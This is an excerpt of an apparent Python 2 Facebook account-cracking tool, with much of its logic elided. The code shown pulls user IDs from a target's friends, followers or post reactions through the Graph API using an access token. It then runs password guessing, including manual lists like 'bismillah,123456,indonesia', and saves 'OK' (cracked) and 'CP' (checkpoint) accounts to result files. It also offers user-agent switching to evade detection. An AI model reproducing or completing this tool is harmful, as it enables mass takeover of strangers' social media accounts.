...
def menu():
	...
	try:
		...
		sys.exit()
	logo()
	print(" \033[0;97m[\033[0;96m+\033[0;97m] User Active : \033[0;92m %s"%(nama))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] IP Address  : \033[1;94m "+ip)
...
def public():
	...
	try:
		...
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		tokenz()
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Type 'me' if you want to crack from your friendslist")
	idt = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] ID Public : \033[1;90m ")
	try:
		pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
		sp = json.loads(pok.text)
		print(" \033[0;97m[\033[0;92m+\033[0;97m] Name : \033[0;92m"+sp["name"])
	except KeyError:
		exit(' \033[0;97m[\033[0;91m!\033[0;97m] ID Public Missing \x1b[1;91m!')
	...
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Do you want to use manual password[\033[0;93m?\033[0;97m] Y/t : ")
	if ask == "Y" or ask == "y":
		manual()
	...
	def main(user):
		...
		pwx = []
		sys.stdout.write(
		      '\r \x1b[0;97m[\x1b[0;96m%s\x1b[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid,name=user.split("<=>")
...
def followers():
	...
	try:
		...
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		tokenz()
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Type 'me' if you want to crack from your followers")
	...
	for i in z["data"]:
		...
		id.append(uid+'<=>'+name)
	print(" \033[0;97m[\033[0;93m*\033[0;97m] Total ID  : \033[0;91m"+str(len(id)))
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Do you want to use manual password[\033[0;91m?\033[0;97m] Y/t : ")
	if ask == "Y" or ask == "y":
		manual()
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
...
def reaction():
	...
	try:
		...
		exit(' \033[0;97m[\033[0;91m!\033[0;97m] Post ID Missing \x1b[1;91m!')
...
def manual():
	print(" \033[0;97m[\033[0;93m*\033[0;97m] Exp : bismillah,123456,indonesia")
	pw = raw_input(" \033[0;97m[\033[0;93m?\033[0;97m] Create List Password : ")
...
### SETTING USER AGENT
def settingua():
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Do you want to change the User Agent[\033[0;93m?\033[0;97m] [Y/t] : ") 
	if ask =="":
		menu()
	elif ask == "y" or ask == "Y":
		try:
